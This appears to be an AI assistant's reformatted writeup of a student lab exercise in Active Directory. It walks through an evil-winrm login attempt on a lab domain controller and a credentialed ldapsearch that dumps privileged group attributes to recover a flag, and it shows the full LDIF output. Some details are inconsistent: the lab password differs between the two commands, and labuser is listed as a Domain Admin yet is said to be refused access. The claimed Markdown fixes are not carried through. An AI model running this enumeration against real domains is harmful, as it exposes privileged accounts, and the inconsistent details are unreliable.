Let's tighten this up. GitHub renders certain elements differently, and unofficial alert tags like [!KEY] will just display as raw text rather than a clean callout box.

Here is a heavily optimized, clean, and highly readable version tailored specifically for GitHub Flavored Markdown (GFM). It fixes line wrapping issues in the LDIF log, utilizes valid GitHub alert blocks ([!NOTE], [!TIP], [!WARNING]), and streamlines the headers for a professional profile or repository writeup.
Markdown

# Active Directory Baseline Assessment: Group Metadata Inspection

This technical writeup details the methodology for identifying hidden information leaks within Active Directory privileged group objects from an external attack platform.

---

## 🎯 Objective & Mission Parameters

Active Directory groups store more than just member lists. Non-standard or operational attributes often contain legacy notes, administrative descriptions, or sensitive configuration details that remain hidden during default directory queries. 

* **Task:** Enumerate domain security groups and inspect extended/operational attributes.
* **Target:** A well-known privileged group containing an exposed flag string.
* **Repository Target:** `holbertonschool-cyber_security/Active_directory/0x01-AD_Basics_And_Concepts/2-flag.txt`

> [!TIP]
> Standard directory queries automatically omit operational attributes to save bandwidth. To uncover hidden data, you must explicitly request both user (`*`) and operational (`+`) fields during the LDAP binding phase.

---

## 🚧 Stage 1: Analyzing the Initial WinRM Failure

When establishing an initial foothold, operators frequently attempt interactive remote management sessions via protocols like WinRM (`evil-winrm`). 

```bash
evil-winrm -i 192.168.56.20 -u labuser -p 'Password123!'
```
Terminal Event Log
Plaintext

Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\> net.exe group /domain

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
Error: Exiting with code 1

Why Did This Fail?

    Target Architecture: An nmap sweep reveals ports 88 (Kerberos) and 389 (LDAP) are open on 192.168.56.20, identifying it as the Domain Controller (DC).

    Access Restrictions: Windows security policies strictly prohibit standard domain accounts (or mismatched local workstation accounts) from establishing interactive WinRM or RDP sessions directly on a Domain Controller.

    Session Termination: The connection handshake succeeds because the port is listening, but the moment a command thread is spawned, the DC evaluates the user token, denies interactive rights, and forcibly drops the connection thread (wsmprovhost.exe).

🎯 Stage 2: Pivoting to Lower-Level Protocols (LDAP)

Because interactive shells are blocked, we must shift down the protocol stack to LDAP (Port 389). Active Directory allows any valid domain account to query the directory tree over LDAP without requiring interactive desktop log-on permissions.
Modern ldapsearch Tool Syntax

Modern versions of ldapsearch on Kali Linux have deprecated the legacy host (-h) and port (-p) switches. Trying to run -h 192.168.56.20 causes parsing errors. Instead, we use a fully qualified LDAP Uniform Resource Identifier (URI) via the -H flag.
⚡ Stage 3: Crafting the Target Attribute Query

By passing verified domain credentials (P@ssw0rd123!), setting the base search path, and appending the user/operational wildcards (* and +), we force the Domain Controller to dump all hidden object properties.
```Bash

ldapsearch -H ldap://192.168.56.20 \
  -x \
  -D "CN=labuser,CN=Users,DC=PENTESTLAB,DC=local" \
  -w 'P@ssw0rd123!' \
  -b "DC=PENTESTLAB,DC=local" \
  "(&(objectCategory=group)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Backup Operators)))" \
  "*" "+"
```
Parameter Breakdown
Switch	Purpose
-H ldap://...	Specifies the targeted Domain Controller URI entrypoint.
-x	Uses Simple Authentication instead of complex SASL negotiations.
-D	The Bind Distinguished Name (the absolute path identity of the executing user).
-w	The plaintext password string matching the active domain profile.
-b	The Search Base DN specifying where to begin looking in the directory tree.
"(&...)"	Logic Filter: Find objects matching category group AND named Domain Admins, Enterprise Admins, OR Backup Operators.
"*" "+"	Explicitly requests all standard user attributes (*) and all constructed operational attributes (+).
📊 Stage 4: Extracted Directory Data & Analysis

The query successfully binds to the directory database and yields the following structured LDIF data:
LDIF

# Domain Admins, Users, PENTESTLAB.local
dn: CN=Domain Admins,CN=Users,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: group
cn: Domain Admins
member: CN=labuser,CN=Users,DC=PENTESTLAB,DC=local
member: CN=App-Admins,CN=Users,DC=PENTESTLAB,DC=local
member: CN=Administrator,CN=Users,DC=PENTESTLAB,DC=local
distinguishedName: CN=Domain Admins,CN=Users,DC=PENTESTLAB,DC=local
instanceType: 4
whenCreated: 20260129193813.0Z
whenChanged: 20260513144532.0Z
info: FLAG2{5b71afb34d4d0173498aa18c78cece76b07c58b05c8cbd54252050cf7421}
sAMAccountName: Domain Admins
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=PENTESTLAB,DC=local

# Backup Operators, Builtin, PENTESTLAB.local
dn: CN=Backup Operators,CN=Builtin,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: group
cn: Backup Operators
description: Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
sAMAccountName: Backup Operators
sAMAccountType: 536870912

# Enterprise Admins, Users, PENTESTLAB.local
dn: CN=Enterprise Admins,CN=Users,DC=PENTESTLAB,DC=local
objectClass: top
objectClass: group
cn: Enterprise Admins
description: Designated administrators of the enterprise
sAMAccountName: Enterprise Admins
sAMAccountType: 268435456

# search result
search: 2
result: 0 Success

🧠 Offensive Security Post-Mortem

    The Exposure: Reviewing the structures shows standard installations for the Backup Operators and Enterprise Admins nodes. However, the privileged Domain Admins container leaks a sensitive data string within its info attribute field.

    The Vulnerability Principle: The info attribute is a free-form comment property. Systems administrators frequently drop legacy deployment logs, notes, or automation tokens here under the assumption that they are "hidden" because they do not display inside standard administrative graphical interface layouts (like dsa.msc).

    The Remediation: Active Directory permits all authenticated domain users to read descriptive attributes of core structural directory containers by default. Storing high-value data strings or configurations in non-standard attributes breaks the Principle of Least Privilege and leads directly to internal data compromise.

    [!IMPORTANT]
    Captured Mission Flag: > FLAG2{5b71afb34d4d0173498aa18c78cece76b07c58b05c8cbd54252050cf7421}
